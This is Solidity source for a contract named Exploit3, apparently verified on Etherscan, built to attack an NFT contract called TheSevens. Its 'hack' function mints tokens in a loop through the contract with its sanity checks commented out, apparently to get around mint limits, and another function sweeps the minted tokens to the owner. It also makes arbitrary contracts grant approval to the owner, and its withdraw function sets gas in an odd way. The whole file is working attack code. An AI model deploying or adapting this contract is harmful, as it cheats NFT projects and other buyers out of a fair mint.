/**
 *Submitted for verification at Etherscan.io on 2021-09-12
*/

// SPDX-License-Identifier: no-license
pragma solidity 0.8.0;

interface ITheSevens {
    function mintTokens(uint256 count) external payable;
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
    function setApprovalForAll(address operator, bool approved) external;
}

contract Exploit3 {
    address public owner;
    ITheSevens public theSevens;
    constructor(address _theSevensAddr) {
        theSevens = ITheSevens(_theSevensAddr);
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function transferERC721Token(uint256 startNum, uint256 count)  public onlyOwner{
        for (uint i =0; i < count; ) {
            theSevens.transferFrom(address(this), owner, startNum+i);
            i = selfAdd(i);
        }
    }
    function selfAdd(uint256 i) internal pure returns (uint256){
        require(i != type(uint256).max);
        return 1 + i;
        
    }
    function setApprovalForAll(address operator)  public onlyOwner {
        require(isContract(operator));
        ITheSevens(operator).setApprovalForAll{gas: gasleft()}(owner, true);
    }
    function isContract(address _target) view internal returns (bool) {
        uint256 _extcodesize = 0;
        assembly{
            _extcodesize := extcodesize(_target)
        }
        if (_extcodesize > 0) {
            return true;
        }
        return false;
    }
    function transferOwnership(address newOwner)  public onlyOwner{
        if (newOwner != address(0)) {
            owner = newOwner;
            return;
        }
        revert("Ownable: caller is not the owner");
    } 
    fallback() external payable {
        revert();
    }
    
    receive() external payable {
        
    }
    function onERC721Received(address, address, uint256, bytes calldata ) external pure returns (bytes4) {
        bytes4 res = bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
        return res;
    }
    function withdraw() public onlyOwner{
       (bool success, )=  msg.sender.call{value:address(this).balance,gas: 2300*address(this).balance}("");
       require(success);
    }
    function hack(uint256 price, uint256 count) public onlyOwner payable {
        // require(price > 0 && count > 0, "Exploit3/hack price wrong");
        // require(price * count == msg.value, "Exploit3/hack msg.value wrong");
        for (uint i=0; i < count; i++) {
            // require(isContract(address(theSevens)), "not a contract");
            theSevens.mintTokens{value: price}(1);
        }
    }
    function renounceOwnership() public onlyOwner{
        owner = address(0);
    }
    
}